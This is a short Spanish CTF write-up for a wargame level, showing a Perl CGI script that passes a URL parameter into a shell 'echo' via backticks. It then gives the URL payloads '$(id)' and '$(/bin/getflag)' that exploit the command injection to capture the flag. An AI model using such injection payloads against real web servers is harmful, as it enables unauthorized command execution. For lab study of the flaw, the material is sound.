- Encuentro en /home/level04 un fichero level04.pl
cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
- Busco el archivo en la VM find / -name level04.pl 2>/dev/null
- Está tambien en var/www/level04/level04.pl
- Deduzco por el script que hay un servidor web levantado en localhost:4747
- pongo la dirección ip de VM :4747 en la barra del navegador y no da error
- El script parece que hace echo sobre el primer parametro y lo muestra
- Pongo en la barra del navegador VMip:4747/?x=hola y muestra en el navegador hola
- Pongo en la barra del navegador VMip:4747/?x=$(id) y muestra en el navegador el output del comando id
- Se tiene ejecución de comandos
- VMip:4747/?x=$(/bin/getflag) y obtengo la flag

